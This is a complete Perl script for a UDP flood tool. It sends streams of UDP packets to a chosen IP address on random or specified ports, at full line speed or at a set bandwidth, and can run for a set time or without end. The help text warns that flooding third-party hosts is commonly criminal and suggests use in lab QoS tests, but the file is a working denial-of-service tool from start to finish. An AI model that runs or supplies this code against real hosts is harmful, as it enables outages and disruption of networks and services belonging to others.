 #!/usr/bin/perl
 #####################################################
 # udp flood. original script http://wiki.nil.com/UDP_flood_in_Perl
 ######################################################
 
 use Socket;
 use strict;
 use Getopt::Long;
 use Time::HiRes qw( usleep gettimeofday ) ;
 
 our $dport = 0;
 our $sport = 0;
 our $size = 0;
 our $time = 0;
 our $bw   = 0;
 our $help = 0;
 our $delay = 0;

 
 GetOptions(
 	"dport=i" => \$dport,	# destination UDP port to use, numeric, 0=random
	"sport=i" => \$sport,   # source UDP port to use, numeric, 0=random
 	"size=i" => \$size,		# packet size, number, 0=random
 	"bandwidth=i" => \$bw,	# bandwidth to consume
 	"time=i" => \$time,		# time to run
 	"delay=f"=> \$delay,	# inter-packet delay
 	"help|?" => \$help);	# help
 	
 
 my ($ip) = @ARGV;
 
 if ($help || !$ip) {
   print <<'EOL';
 flood.pl --dport=dst-port --size=pkt-size --time=secs
          --bandwidth=kbps --delay=msec ip-address
 
 Defaults:
   * random destination UDP ports are used unless --port is specified
   * random-sized packets are sent unless --size or --bandwidth is specified
   * flood is continuous unless --time is specified
   * flood is sent at line speed unless --bandwidth or --delay is specified
 
 Usage guidelines:
   --size parameter is ignored if both the --bandwidth and the --delay 
     parameters are specified. Should be larger than 64 and less than 1500.
 
   Packet size is set to 256 bytes if the --bandwidth parameter is used 
     without the --size parameter
 
   The specified packet size is the size of the IP datagram (including IP and
   UDP headers). Interface packet sizes might vary due to layer-2 encapsulation.
 
 Warnings and Disclaimers:
   Flooding third-party hosts or networks is commonly considered a criminal activity.
   Flooding your own hosts or networks is usually a bad idea
   Higher-performace flooding solutions should be used for stress/performance tests
   Use primarily in lab environments for QoS tests
EOL
   exit(1);
 }
 
 if ($bw && $delay) {
   print "WARNING: computed packet size overwrites the --size parameter ignored\n";
   $size = int($bw * $delay / 8);
 } elsif ($bw) {
   $delay = (8 * $size) / $bw;
 }
 
 $size = 256 if $bw && !$size;
 
 ($bw = int($size / $delay * 8)) if ($delay && $size);
 
 my ($iaddr,$endtime,$psize,$pport,);
 $iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
 $endtime = time() + ($time ? $time : 1000000);
 socket(flood, PF_INET, SOCK_DGRAM, 17); 
 ###socket(flood, AF_INET, SOCK_DGRAM, getprotobyname('udp'));
 bind(flood,sockaddr_in($sport,INADDR_ANY)) or die "Cannot open $sport\n";
 
 print "Flooding $ip " . ($dport ? $dport : "random") . " destination port with " . 
   ($size ? "$size-byte" : "random size") . " packets" . ($time ? " for $time seconds" : "") . "\n";
 print "Interpacket delay $delay msec\n" if $delay;
 print "total IP bandwidth $bw kbps\n" if $bw;
 print "Break with Ctrl-C\n" unless $time;
 
 die "Invalid packet size requested: $size\n" if $size && ($size < 64 || $size > 1500);
 $size -= 28 if $size;
 for (;time() <= $endtime;) {
   $psize = $size ? $size : int(rand(1024-64)+64) ;
   $pport = $dport ? $dport : int(rand(65500))+1;
 
   send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
   usleep(1000 * $delay) if $delay;
 }